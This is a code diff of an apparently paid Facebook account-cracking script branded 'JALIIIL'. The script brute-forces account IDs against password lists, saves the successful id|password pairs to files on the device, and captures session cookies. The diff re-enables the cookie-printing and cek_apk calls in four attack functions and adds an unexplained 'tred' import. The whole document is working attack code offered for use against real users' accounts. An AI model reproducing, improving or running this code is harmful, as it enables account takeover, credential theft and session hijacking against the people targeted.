@@ -1,5 +1,5 @@
 from os import path
-import os,base64,zlib,pip,urllib,time,random
+import os,base64,zlib,pip,urllib,time,random,tred
 print('[\033[1;32m✓\033[1;37m] Checking For Update !! ')
 time.sleep(1.5)
 print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
@@ -125,7 +125,7 @@ logo=(f"""\x1b[38;5;208m
  \033[1;91mFACEBOOK  : \033[1;36mH. M. JALIL\033[1;37m
  \033[1;91mTELEGRAM  : \033[1;36mITZJALIL0\033[1;37m
  \033[1;91mWHATSAPP  : \033[1;36m213676980481\033[1;37m
- \033[1;91mVERSIONl  : \033[1;36m1.3\033[1;37m
+ \033[1;91mVERSIONl  : \033[1;36m1.0\033[1;37m
  \033[1;91mTOOL      : \033[1;36mPAID\033[1;37m
 \033[1;33m========================================================\033[1;33m
 """)
@@ -227,8 +227,8 @@ def m1(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                #cek_apk(session,coki)
-                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                cek_apk(session,coki)
+                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -270,8 +270,8 @@ def m3(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                #cek_apk(session,coki)
-                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                cek_apk(session,coki)
+                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -313,8 +313,8 @@ def m2(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                #cek_apk(session,coki)
-                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                cek_apk(session,coki)
+                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -356,8 +356,8 @@ def m4(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                #cek_apk(session,coki)
-                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                cek_apk(session,coki)
+                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
